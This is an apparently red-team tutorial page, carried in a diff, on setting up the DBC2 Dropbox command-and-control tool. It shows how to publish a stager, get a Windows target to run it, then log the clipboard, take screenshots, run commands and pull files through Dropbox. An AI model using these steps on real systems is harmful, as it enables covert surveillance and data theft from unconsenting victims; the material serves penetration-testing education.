@@ -1,0 +1,94 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/" rel="category tag">Command and Control</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Command and Control with Dropbox C2</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/dropbox-c2-command-and-control/" rel="bookmark"><time class="entry-date published" datetime="2019-04-12T14:26:17+00:00">April 12, 2019</time><time class="updated" datetime="2025-05-13T09:43:08+00:00">May 13, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, we will learn how to use DropboxC2 tool. It is also known as DBC2.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;">Introduction</span></li>
+<li><span style="color: #000000;">Installation</span></li>
+<li><span style="color: #000000;">Getting Dropbox API</span></li>
+<li><span style="color: #000000;">Exploiting Target</span></li>
+<li><span style="color: #000000;">Sniffing Clipboard</span></li>
+<li><span style="color: #000000;">Capturing Screenshot</span></li>
+<li><span style="color: #000000;">Command Execution</span></li>
+<li><span style="color: #000000;">File Download</span></li>
+</ul>
+<h3><span style="color: #800000;">Introduction</span></h3>
+<p><span style="color: #000000;">DBC2 is primarily a tool for post-exploitation. It has an agent running on the target’s machine, a controller, running on any machine, PowerShell modules, and Dropbox servers as a means of communication. The PowerShell Empire Framework inspires it. Developers create this tool using Python. The credit for developing this tool goes to <a style="color: #000000;" href="https://twitter.com/Arno0x0x">Arno0x0x</a>.</span></p>
+<p><span style="color: #000000;">For this particular demonstration,</span></p>
+<p><span style="color: #000000;"><strong>Attacker</strong>: Kali Linux</span></p>
+<p><span style="color: #000000;"><strong>Target</strong>: Windows 10</span></p>
+<p><span style="color: #000000;">Installation</span></p>
+<p><span style="color: #000000;">To begin, first, we need the tool on our Attacker Machine. To do this, we will clone the tool directly from the GitHub.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/Arno0x/DBC2</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-FIgdVauBSkw/XLACGTOg-gI/AAAAAAAAd7Y/O_DPgPes3CoaNNjZGnx6tSJkK9GWXQmWACLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">After running the above command, we would have a directory created by the name of DBC2. Now, we will traverse inside that directory using the cd command. After that, we are going to need to install the dependencies of the tool. There are multiple ways to do this, but here we are using pip command along with a requirements.txt file that we cloned from git earlier.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd DBC2/
+pip install -r requirements.txt</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-PIH6Aenq_Bc/XLACJmm5K2I/AAAAAAAAd8A/17CpMV1bPBsyXVg-ieN4gWfo6yeld1TogCLcBGAs/s1600/2.png" alt="Dropbox C2 Command and Control" width="521" height="127"/></span></p>
+<h3><span style="color: #800000;">Getting Dropbox API</span></h3>
+<p><span style="color: #000000;">Now, this tool uses the Dropbox Servers as the medium to run agents on the target machine. In order to do that, this tool requires a Dropbox API. To get that, first, create an account on <a style="color: #000000;" href="https://www.dropbox.com/">Dropbox</a>. Then after creating the account, head to developer tools <strong><a style="color: #000000;" href="https://www.dropbox.com/developers/apps/create">here</a></strong>. A webpage will open similar to the one shown below. Here we will select the “Dropbox API”. Then in the type of access section, we will choose “App folder”. Name the app as per choice. Then click on Create App Button to proceed.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-aZfoZNb3aUk/XLACJ7r6vzI/AAAAAAAAd8E/VdAO51GHb_Q8l5qDRPadiWLVZsYAR80RwCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">This will lead to another webpage as shown below. Here, move on to the O Auth 2 Section, and </span></p>
+<p><span style="color: #000000;">Generate access token. This will give the Dropbox API required for this particular practical.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://3.bp.blogspot.com/-y7LK_Mi0aU0/XLACKW2j0FI/AAAAAAAAd8I/LUV6gsAAnOkFKhOGWtkAqrahsmWYhwO9gCLcBGAs/s1600/4.png" alt="Dropbox C2 Command and Control" width="783" height="398"/></span></p>
+<p><span style="color: #000000;">Copy the Generated access token, now get to the directory we cloned earlier. Here we have a file named config.py. We will open it using nano command and paste the Access token as the value for “defaultAccessToken” as shown in the given screenshot given below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-RRlsuqlRX9A/XLACKsn5XRI/AAAAAAAAd8M/KEtBT5C8wmA3ML2baOFAUfoY8D3t2bthQCLcBGAs/s1600/5.png"/></span></p>
+<h3><span style="color: #800000;">Exploiting Target</span></h3>
+<p><span style="color: #000000;">Now, it’s time to run the tool, check for appropriate permission before running the tool. As we run the tool, we are greeted with a cool looking banner as shown in the given below. Followed by some details about the Author and Version and tool. After this, it will ask for a master password which will be used to encrypt all the data between the agents and the controller. Enter the password of choice. It will encrypt the password entered and display the result. We can copy the code shown and add to the config.py file so that it doesn’t ask again for a master password. After this, it will create an incoming directory inside the Directory we cloned earlier. This will be used as a buffer to save files from the target.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python dropboxC2.py</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://3.bp.blogspot.com/-VYANON8MyZM/XLACK1GA8NI/AAAAAAAAd8Q/jEpl64Gfccwo5eKEwllyan19s6rLR7FqwCLcBGAs/s1600/6.png" alt="Dropbox C2 Command and Control" width="868" height="418"/></span></p>
+<h4><span style="color: #000000;">Uploading the Modules and Stager to Dropbox</span></h4>
+<p><span style="color: #000000;">This tool requires to upload the modules and stager on Dropbox before proceeding further. We will do this using the command given below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">publishStage dbc2_agent.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-evdLTkaieL4/XLACLTCqkcI/AAAAAAAAd8Y/zqQyf_eFdW8Z8b2JtPY6dr6-IPgiPY8aQCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">This will upload a file on the Dropbox as shown in the image given below. This file is encrypted using XOR encryption.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://2.bp.blogspot.com/-SoG_dEenruA/XLACLRT8oFI/AAAAAAAAd8U/hOugxqtt8xU8SMTLZT2EqcjgWfZMiI5vACLcBGAs/s1600/8.png" alt="Dropbox C2 Command and Control" width="440" height="422"/></span></p>
+<p><span style="color: #000000;">Now let’s check if the stage is published using the command given below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">listPublishedStage</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BVo54jErhOs/XLACLxn-vVI/AAAAAAAAd8c/SLhn9oM2xjQ7_pZ7mGN5wRVC23KeFgSMwCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Now that stage is uploaded, let’s use it to create a stager. We are going to create a batch file. But we can use many other types of stager options. This tool provides stager in macro, oneliner, JavaScript, MS build sct and much more. This command will create a stager.bat in the tmp directory. We sent this bat file to our target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">genStager batch default</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZNPtwy0sCqc/XLACGQ47McI/AAAAAAAAd7c/Vgk_NNvTkIU6WmKr6p0hvfgpSnaomvLcQCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">After the target machine executes the batch file, a message will inform us on the terminal that Agent found with ID. Now we will use the list command to see the list of the agents. And then we will copy the AgentID and then use it to interact with the session as shown in the given image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">list
+use [AgentID]</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://3.bp.blogspot.com/-cviL_CC_jZc/XLACGFzfWAI/AAAAAAAAd7U/eN2rHNyJ9j4dIERnq_h-7Sm-Mx6WJO98ACLcBGAs/s1600/12.png" alt="Dropbox C2 Command and Control" width="657" height="198"/></span></p>
+<p><span style="color: #000000;">This will create a file on the Dropbox with the .status extension as shown in the given image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Npymm7Rko6c/XLACHfyHqpI/AAAAAAAAd7g/NUHdzXTNu5gILnDaehZarAy3XMabCXzSQCLcBGAs/s1600/13.png"/></span></p>
+<h3><span style="color: #800000;">Clipboard Sniffing</span></h3>
+<p><span style="color: #000000;">We can get the clipboard data that the target has on its clipboard. That is., the data he/she has copied. To do this we will have to start a sniffer using the command clipboardLogger start. Then wait till the target copies some data. Then Stop the sniffer using the command clipboardLogger stop. After stopping the sniffer the clipboard will be saved in a text file inside the incoming directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">clipboardLogger start
+clipboardLogger stop</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://4.bp.blogspot.com/-j3z87SQvmss/XLACHh9awVI/AAAAAAAAd7k/plF8KVMiF6Y8W7KV9aGCwQrvCCYvRLLGwCLcBGAs/s1600/14.png" alt="Dropbox C2 Command and Control" width="772" height="198"/></span></p>
+<p><span style="color: #000000;">Let’s take a look at what target copied on his/her machine. We are going to use the cat command on a new Kali terminal to read the file as shown in the given image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /root/DBC2/incoming/clipboardlogger.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-08iK4R5DaSo/XLACH82DtRI/AAAAAAAAd7o/CfFenFtbj08fP-CuN6wWsVqM6ke8EbeDwCLcBGAs/s1600/15.png"/></span></p>
+<h3><span style="color: #800000;">Capturing Screenshot</span></h3>
+<p><span style="color: #000000;">Now furthermore we can grab a screenshot of then target machine. To do this we will use the screenshot command as shown in the given image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">screenshot</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RcvpG05VYbU/XLACITKF_tI/AAAAAAAAd7s/cQX85JYIWkAz6Y2P3cThauxvJNE9NGgIwCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">The screenshot will be captured and stored in the incoming directory. We can see that the target is browsing a website on his/her machine in the given image.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://3.bp.blogspot.com/-3NkExnXgtNY/XLACIhRNs_I/AAAAAAAAd7w/f5bhzGbHWf0_V-g903UHIcRFQKCGnRK5wCLcBGAs/s1600/17.png" alt="Dropbox C2 Command and Control" width="887" height="549"/></span></p>
+<h3><span style="color: #800000;">Command Execution</span></h3>
+<p><span style="color: #000000;">We can run some PowerShell commands on the target machine using the parameter cmd. This tool doesn’t offer the shell but it can execute one command at a time. So, we type cmd and then it asks the command that is to be executed. Here we run the command dir. And we have the list of files as shown in the given image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmd
+dir</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://3.bp.blogspot.com/-b7cQ4wTEZ9M/XLACIm1dLnI/AAAAAAAAd70/o9rvmtKfrLEyRM-Gjm1CR39zs8upIq8mACLcBGAs/s1600/18.png" alt="Dropbox C2 Command and Control" width="767" height="492"/></span></p>
+<h3><span style="color: #800000;">File Download</span></h3>
+<p><span style="color: #000000;">Furthermore, we can download files from the target. To do this we will have to use the command getFile followed by the file name or path. This will download the file form the target to our attacker machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">getFile sharetext.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-zLCPTwMW6pk/XLACJPheOcI/AAAAAAAAd74/K9svm39lFqcHGfWjmMeeVWQwfy4YCas-wCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">The tool will download the file inside the incoming directory we discussed earlier. We can view the file using cat command as shown in the image given below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /root/DBC2/incoming/sharetext.txt</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://3.bp.blogspot.com/-IyHCZKZIAPU/XLACJd9C_II/AAAAAAAAd78/29MFieE7SUAxNVGw7eVXPkNKe0HVUo7VACLcBGAs/s1600/20.png" alt="Dropbox C2 Command and Control" width="476" height="40"/></span></p>
+<p><span style="color: #000000;">To learn more about <strong>Command and Control</strong>. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/">Link.</a></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavandeep-singh-6b1074132" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.linkedin.com/in/pavandeep-singh-6b1074132&amp;source=gmail&amp;ust=1542651210170000&amp;usg=AFQjCNEYOzlThg6B1HzKcEZNou4HowCJ2Q">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
